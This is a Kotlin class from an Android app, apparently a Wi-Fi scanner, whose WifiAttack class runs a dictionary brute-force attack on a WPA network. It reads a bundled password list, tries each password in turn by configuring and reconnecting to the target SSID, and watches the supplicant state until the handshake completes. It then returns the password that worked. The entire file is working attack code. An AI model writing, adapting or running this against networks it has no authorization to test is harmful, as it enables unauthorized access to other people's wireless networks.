package com.wpam.scanner.attack

import android.content.Context
import android.net.wifi.SupplicantState
import android.net.wifi.WifiConfiguration
import android.net.wifi.WifiManager
import android.util.Log
import com.wpam.scanner.db.Wifi


class WifiAttack(private val context: Context) {

    private fun readDict(dictName: String): String {
        val res = context.resources
        val rId = res.getIdentifier(dictName, "raw", context.packageName)
        val inputStream = res.openRawResource(rId)

        val b = ByteArray(inputStream.available())
        inputStream.read(b)
        return String(b)
    }

    fun bruteForce(wifi: Wifi, dictName: String): String {

        val networkSSID = wifi.ssid

        val wifiManager = context.getSystemService(Context.WIFI_SERVICE) as WifiManager


        val dictData = readDict(dictName)
        for (passwd in dictData.split("\n")){
            val conf = WifiConfiguration()
            conf.SSID = "\"" + networkSSID + "\""
            conf.preSharedKey = "\""+ passwd.trim() +"\""

            wifiManager.addNetwork(conf)

            wifiManager.disconnect()
            wifiManager.enableNetwork(conf.networkId, true)
            wifiManager.reconnect()

            var status: SupplicantState
            var state = SupplicantState.INACTIVE

            do {
                status = wifiManager.connectionInfo.supplicantState
                if (status == SupplicantState.FOUR_WAY_HANDSHAKE && state != SupplicantState.FOUR_WAY_HANDSHAKE) {
                    state = SupplicantState.FOUR_WAY_HANDSHAKE
                }
                else if ( state == SupplicantState.FOUR_WAY_HANDSHAKE ) {

                    if (status == SupplicantState.COMPLETED) {
                        break
                    }
                    else if (status == SupplicantState.DISCONNECTED) {
                        break
                    }
                }
            } while (true)

            val networks = wifiManager.configuredNetworks
            for (net in networks) {
                wifiManager.removeNetwork(net.networkId)
            }

            if (status == SupplicantState.COMPLETED){
                return passwd
            }
        }
        return ""

    }
}